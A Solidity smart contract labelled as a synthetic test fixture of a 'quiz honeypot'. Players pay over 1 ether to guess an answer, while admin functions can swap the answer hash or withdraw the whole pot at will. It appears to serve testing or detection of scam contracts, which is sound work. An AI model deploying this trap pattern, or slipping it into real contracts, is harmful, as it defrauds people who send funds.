pragma solidity ^0.5.8;

// Synthetic fixture (Phase 19): quiz honeypot shape. Players pay > 1 ether
// to guess; a correct guess is paid the balance. The admin can replace the
// answer hash (New) or withdraw the pot (Stop) at any time.
contract QuizHoneypot {
    string public question;
    bytes32 responseHash;
    mapping(bytes32 => bool) admin;

    constructor(bytes32[] memory admins) public {
        for (uint256 i = 0; i < admins.length; i++) {
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin() {
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    function Try(string memory _response) public payable {
        require(msg.sender == tx.origin);
        if (responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether) {
            msg.sender.transfer(address(this).balance);
        }
    }

    function Start(string memory _question, string memory _response) public payable isAdmin {
        if (responseHash == 0x0) {
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        msg.sender.transfer(address(this).balance);
    }

    function New(string memory _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    function() external payable {}
}
